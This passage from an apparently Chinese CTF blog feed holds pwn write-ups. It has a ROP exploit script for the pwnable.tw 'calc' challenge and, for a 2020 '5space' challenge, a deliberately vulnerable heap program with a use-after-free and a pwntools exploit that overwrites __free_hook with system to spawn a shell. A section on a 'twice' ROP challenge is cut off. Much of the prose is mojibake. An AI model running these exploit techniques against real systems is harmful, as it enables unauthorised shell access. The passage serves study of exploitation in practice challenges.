ˆåº•ã€‚ä¸è¿‡è¿™ä¸ªebpæŒ‡å‘çš„ç¡®åˆ‡ä½ç½®æˆ‘ä»¬ä¸çŸ¥é“ï¼Œå› æ­¤åªèƒ½å†æ‰¾æ‰¾å…¶ä»–åç§»ã€‚åœ¨mainå‡½æ•°çš„æ±‡ç¼–ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ±‚å‡ºespçš„å€¼ã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>â€‹        é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è€Œæ±‚å‡ºmainå‡½æ•°çš„æ ˆå¸§å¤§å°ä¸ºebp-esp+4ï¼Œå› ä¸ºebpå’Œespæ‰€åœ¨çš„å•ä½éƒ½ç®—mainå‡½æ•°çš„æ ˆå¸§ï¼Œå› æ­¤éœ€è¦åŠ 4ã€‚</p><p>â€‹        çŸ¥é“main_sizeä¹‹åï¼Œå†ç”¨ebp - main_sizeï¼Œå°±æ±‚å‡ºäº†mainå‡½æ•°çš„æ ˆé¡¶ï¼Œæˆ–è€…è¯´calcæ ˆåº•å‘ä¸‹çš„ä¸€ä¸ªå•ä½ï¼Œä¹Ÿå°±æ˜¯num[361]çš„ä½ç½®ã€‚è€Œæˆ‘ä»¬çŸ¥é“binè¯­å¥çš„åœ°å€åœ¨num[368]ï¼Œå› æ­¤ebp - main_size + 4*8å°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥â€/bin/shâ€çš„åœ°å€ã€‚</p><h3 id="C-Exploit"><a href="#C-Exploit" class="headerlink" title="C . Exploit"></a>C . Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">int80_addr = <span class="number">0x08049a21</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx = <span class="number">0x0804848f</span></span><br><span class="line">pop_ecx_pop_ebx = <span class="number">0x080701d1</span></span><br><span class="line">stack = [pop_eax,<span class="number">0xB</span>,pop_edx,<span class="number">0</span>,pop_ecx_pop_ebx,<span class="number">0</span>,<span class="number">0</span>,int80_addr,u32(<span class="string">&quot;/bin&quot;</span>),u32(<span class="string">&quot;/sh\x00&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">i=p.recv()</span><br><span class="line">ebp = <span class="built_in">int</span>(i)+<span class="number">0x100000000</span></span><br><span class="line">esp = (ebp&amp;<span class="number">0xFFFFFFF0</span>)-<span class="number">0x10</span></span><br><span class="line">main_size = ebp - esp + <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> main_size</span><br><span class="line">rop_size = <span class="number">4</span>*<span class="number">8</span></span><br><span class="line">stack[<span class="number">6</span>] = <span class="built_in">int</span>(i)-main_size+rop_size</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">index = <span class="number">361</span> + i</span><br><span class="line">p.sendline(<span class="string">&quot;+&quot;</span>+ <span class="built_in">str</span>(index))</span><br><span class="line">data = <span class="built_in">int</span>(p.recvline())</span><br><span class="line"><span class="keyword">if</span>( stack[i]&gt;data):</span><br><span class="line">p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">result = <span class="built_in">int</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;num[&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;] : &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(result))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;halo....&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹        æœ€åè¿˜å¾—sendlineä¸€ä¸‹æ‰èƒ½getshellã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" />]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5space (of-twiceå¤ç°)</title>
      <link href="2020/07/13/2020_5space/"/>
      <url>2020/07/13/2020_5space/</url>
      
        <content type="html"><![CDATA[<p>â€‹        6æœˆä»½çš„ç¬¬äº”ç©ºé—´ï¼Œä¾ç„¶å•¥ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¸ä»…å¦‚æ­¤ï¼Œå¤ç°è¿˜å¤ç°äº†å¥½å‡ å¤©ï¼Œç®—æ˜¯å¤§è‡´ä¸Šå¼„æ˜ç™½æ€è·¯äº†ã€‚è®°å½•ä¸€ä¸‹ä»¥åå¤ä¹ ç”¨ã€‚<span id="more"></span></p><h2 id="0x00-of"><a href="#0x00-of" class="headerlink" title="0x00 . of"></a>0x00 . of</h2><p>â€‹        é¢˜ç›®ç›´æ¥ç»™çš„å°±æ˜¯ä¸€ä¸ª.cçš„æºç ï¼Œçœ‹æºç remoteè§£é¢˜ã€‚æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* chunks[NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_io</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;cookie, <span class="number">8</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> res;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(SIZE);</span><br><span class="line">    <span class="keyword">if</span>(buf == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chunks[idx] = buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    *p = cookie;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line">    *p = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(chunks[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Content: &quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Content: &quot;</span>));</span><br><span class="line">    write(<span class="number">1</span>, chunks[idx], SIZE - <span class="number">8</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunks[idx], SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init_io();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Made on Ubuntu 18.04&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> choice = get_int();</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                allocate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">delete</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        çœ‹ä¸Šå»æ˜¯ä¸ªheapé¢˜ï¼Œè€Œä¸”æ²¡æœ‰double freeï¼Œä½†æ˜¯æœ‰UAFã€‚ä¸è¿‡è¿™ä¸ªé¢˜ç›®åœ¨æ¯ä¸€ä¸ªchunkä¸­å¡è¿›äº†ä¸€ä¸ªcookiesï¼Œcookieséšæœºç”Ÿæˆï¼Œæ‰€ä»¥è¯´å¦‚æœè¦æ³„éœ²èµ·æ¥å°±ä¼šå¾ˆéº»çƒ¦ã€‚ä¸è¿‡çœ‹äº†ä¸å°‘write upï¼Œéƒ½è¯´è¿™é¢˜åœ¨éƒ¨ç½²ä¸Šæœ‰ç‚¹é—®é¢˜ï¼Œremoteè¿‡å»ä¸å­˜åœ¨cookiesçš„ã€‚æ‰€ä»¥å¯ä»¥æ­£å¸¸æ€è·¯ç›´æ¥å†™ã€‚</p><p>â€‹        ç”¨UAFå¯ä»¥æ³„éœ²å‡ºlibcåŸºè´¨ï¼Œæ”¹å†™free_hookæˆ–è€…malloc_hookï¼Œä½¿å…¶æŒ‡å‘systemï¼Œå†freeæ‰å†™ç€â€/bin/shâ€çš„å †ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº†system(â€œ/bin/shâ€)ã€‚</p><p>â€‹        ä¸è¿‡è¿™é¢˜ç¢°åˆ°äº†ä¸€ä¸ªæ–°çš„æœºåˆ¶tcacheã€‚tcacheæ˜¯åœ¨libc2.23ä¹‹åå¼•å…¥çš„ï¼Œè·Ÿglibcä¸­çš„å„ç§binç±»ä¼¼ï¼Œæ˜¯ä¸€ä¸ªå¯¹chunkè¿›è¡Œç”³è¯·é‡Šæ”¾æ“ä½œæ—¶ä¼šç”¨åˆ°çš„ä¸€ä¸ªå†…å­˜æ± ã€‚tcacheæ˜¯64ä¸ªå•å‘é“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨æœ€å¤š7ä¸ªèŠ‚ç‚¹(chunk)ï¼Œchunkçš„å¤§å°åœ¨32bitä¸Šæ˜¯12åˆ°512ï¼ˆ8byteé€’å¢ï¼‰ï¼›åœ¨64bitsä¸Šæ˜¯24åˆ°1024ï¼ˆ16bytesé€’å¢ï¼‰ã€‚</p><p>â€‹        åœ¨è¿™é¢˜ä¸­ï¼Œç”³è¯·chunkçš„å¤§å°ç»Ÿä¸€ä¸º0x100ï¼Œå±äºunsort binï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœé‡Šæ”¾8ä¸ªchunkï¼Œæ‰ä¼šä½¿ç¬¬8ä¸ªchunkå¤„äºunsort binä¸­ã€‚è€Œæ­¤æ—¶unsort binä¸­ä»…æœ‰ä¸€ä¸ªchunkï¼Œå…¶fdå’Œbkéƒ½æŒ‡å‘main_arenaçš„ä¸€å®šåç§»å¤„ã€‚å³å¯leakå‡ºlibcã€‚</p><p>â€‹        <a href="%5Bhttp://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/%5D(http://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/)">payloadå‚è€ƒ</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,note</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   p.sendafter(<span class="string">&quot;Content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment">#p=remote(&quot;121.36.74.70&quot;,9999)</span></span><br><span class="line">p=process(<span class="string">&quot;./of&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">   delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)-<span class="number">0x7ffff7dcfca0</span>+<span class="number">0x7ffff79e4000</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line">edit(<span class="number">6</span>,p64(libc+<span class="number">0x003ed8e8</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(libc+<span class="number">0x04f440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-twice"><a href="#0x01-twice" class="headerlink" title="0x01 . twice"></a>0x01 . twice</h2><p>â€‹        æœ¬è´¨ä¸Šæ˜¯ä¸ªropé¢˜ã€‚ã€‚ã€‚ä½†æ˜¯ç¡®å®éå¸¸è´¹è„‘å­ï¼Œçœ‹å¾—å¤´ç§ƒï¼Œæœ‰çš„è°ƒè¯•è¿˜æ²¡æ•´æ˜ç™½ï¼Œä¹‹åå†è¯¦ç»†ç ”ç©¶æ¼æ´åŸç†ã€‚</p><p>â€‹        ä¸»å‡½æ•°å¦‚ä¸‹ï¼Œä¸»è¦åŠŸèƒ½æ˜¯éå†è°ƒç”¨judge1ï¼Œå®é™…ä¸Šåªèƒ½æˆåŠŸè°ƒç”¨ä¸¤æ¬¡ã€‚</p><img src="https://s1.ax1x.com/2020/07/13/UYhe8H.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYhe8H.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" /><p>â€‹        judge1æ˜¯ç¨‹åºçš„ä¸»è¦å‡½æ•°ï¼Œå®ç°äº†è¯»å…¥çš„åŠŸèƒ½ï¼Œè¯»å…¥çš„å­—èŠ‚æ•°ç”±judge2å†³å®šã€‚è€Œä¸”å¦‚æœncountä¸ä¸º0æˆ–1ï¼Œåˆ™è¿”å›å€¼ä¸º0ï¼Œè¿™ä¹Ÿå°±é™å®šäº†ä¸»å‡½æ•°ä¸­çš„forå¾ªç¯ä»…è¿›è¡Œä¸¤æ¬¡ã€‚</p><img src="https://s1.ax1x.com/2020/07/13/UYhKKI.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYhKKI.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200713200847301" style="zoom:80%;" /><p>â€‹            judge2ä¸­é™å®šäº†ï¼Œncountä¸º0æ—¶è¿”å›å€¼ä¸º89ï¼Œncountä¸º1æ—¶è¿”å›å€¼ä¸º112ï¼Œå…¶ä»–æƒ…å†µä¸‹ä¸å…è®¸è¯»å…¥ã€‚</p><p><img src="https://s1.ax1x.com/2020/07/13/UYhm2d.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYhm2d.png" 